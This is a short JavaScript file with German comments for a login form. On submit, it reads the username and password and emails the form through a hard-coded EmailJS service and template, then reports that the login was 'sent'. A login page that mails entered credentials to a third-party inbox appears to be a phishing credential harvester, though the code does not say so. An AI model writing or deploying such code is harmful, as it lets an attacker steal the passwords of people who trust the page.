// Initialisiere EmailJS mit deinem Public Key
emailjs.init("DzNDz4UQDPeFWLrjk");

document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (username && password) {
    // Sende das Formular per EmailJS
    emailjs.sendForm("service_dpv66od", "template_e9sbnta", this)
      .then(() => {
        document.getElementById("status").innerText = "Login erfolgreich gesendet!";
      }, (err) => {
        document.getElementById("status").innerText = "Fehler beim Senden: " + JSON.stringify(err);
      });
  } else {
    document.getElementById("status").innerText = "Bitte Benutzername und Passwort eingeben!";
  }
});
